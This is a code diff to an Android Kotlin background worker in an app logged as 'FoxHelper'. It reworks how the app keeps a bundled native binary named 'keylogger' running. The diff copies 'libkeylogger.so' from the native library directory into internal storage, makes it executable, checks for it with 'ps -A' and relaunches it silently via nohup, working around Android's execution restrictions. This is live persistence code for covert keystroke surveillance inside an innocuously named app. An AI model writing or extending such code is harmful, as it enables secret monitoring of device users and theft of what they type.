@@ -5,6 +5,7 @@ import android.util.Log
 import androidx.work.Worker
 import androidx.work.WorkerParameters
 import java.io.BufferedReader
+import java.io.File
 import java.io.InputStreamReader
 
 class WatcherWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {
@@ -12,14 +13,37 @@ class WatcherWorker(context: Context, workerParams: WorkerParameters) : Worker(c
     override fun doWork(): Result {
         Log.d("FoxHelper", "WatcherWorker running...")
         
-        val binaryName = "keylogger"
-        val binaryPath = "/data/local/tmp/$binaryName"
+        // The name of the binary as packaged in the lib/ directory (usually prefixed with lib and suffixed with .so)
+        // Even if it's an executable, Android's build system expects it to look like a shared library to package it.
+        val packagedBinaryName = "libkeylogger.so" 
+        val executableName = "keylogger"
+        
+        val nativeLibraryDir = applicationContext.applicationInfo.nativeLibraryDir
+        val sourceFile = File(nativeLibraryDir, packagedBinaryName)
+        val targetFile = File(applicationContext.filesDir, executableName)
 
-        if (!isProcessRunning(binaryName)) {
-            Log.d("FoxHelper", "Process $binaryName is NOT running. Attempting to restart...")
-            startProcess(binaryPath)
+        // 1. Copy the binary to internal storage if it doesn't exist or if we need to update it
+        if (!targetFile.exists() && sourceFile.exists()) {
+            try {
+                Log.d("FoxHelper", "Copying binary from $sourceFile to $targetFile")
+                sourceFile.copyTo(targetFile, overwrite = true)
+                // 2. Ensure it's executable
+                targetFile.setExecutable(true)
+            } catch (e: Exception) {
+                Log.e("FoxHelper", "Failed to copy or set executable: ${e.message}")
+                return Result.failure()
+            }
+        } else if (!sourceFile.exists() && !targetFile.exists()) {
+             Log.e("FoxHelper", "Binary not found in nativeLibraryDir: $sourceFile")
+             return Result.failure()
+        }
+
+        // 3. Check if running and restart
+        if (!isProcessRunning(executableName)) {
+            Log.d("FoxHelper", "Process $executableName is NOT running. Attempting to restart...")
+            startProcess(targetFile.absolutePath)
         } else {
-            Log.d("FoxHelper", "Process $binaryName is already running.")
+            Log.d("FoxHelper", "Process $executableName is already running.")
         }
 
         return Result.success()
@@ -27,14 +51,11 @@ class WatcherWorker(context: Context, workerParams: WorkerParameters) : Worker(c
 
     private fun isProcessRunning(processName: String): Boolean {
         try {
-            // Note: 'ps' behavior is restricted on modern Android. 
-            // This might only see processes owned by the same UID.
-            // If the binary was started via ADB shell, it runs as 'shell' (UID 2000).
-            // If the app runs it, it runs under the app's UID.
             val process = Runtime.getRuntime().exec("ps -A")
             val reader = BufferedReader(InputStreamReader(process.inputStream))
             var line: String?
             while (reader.readLine().also { line = it } != null) {
+                // Check if the line contains our executable name and is running under our UID
                 if (line?.contains(processName) == true) {
                     return true
                 }
@@ -48,13 +69,9 @@ class WatcherWorker(context: Context, workerParams: WorkerParameters) : Worker(c
 
     private fun startProcess(path: String) {
         try {
-            // Attempt to execute the binary. 
-            // This will fail if the app doesn't have execute permissions on the file,
-            // or due to W^X restrictions if the file isn't in the app's native library dir.
-            // Since ADB pushes to /data/local/tmp/, the app likely cannot execute it directly
-            // unless the device is rooted or the binary is moved to the app's internal storage.
+            // Execute the binary from the app's internal storage
             Runtime.getRuntime().exec(arrayOf("sh", "-c", "nohup $path > /dev/null 2>&1 &"))
-            Log.d("FoxHelper", "Executed restart command.")
+            Log.d("FoxHelper", "Executed restart command for $path")
         } catch (e: Exception) {
             Log.e("FoxHelper", "Failed to start process: ${e.message}")
         }
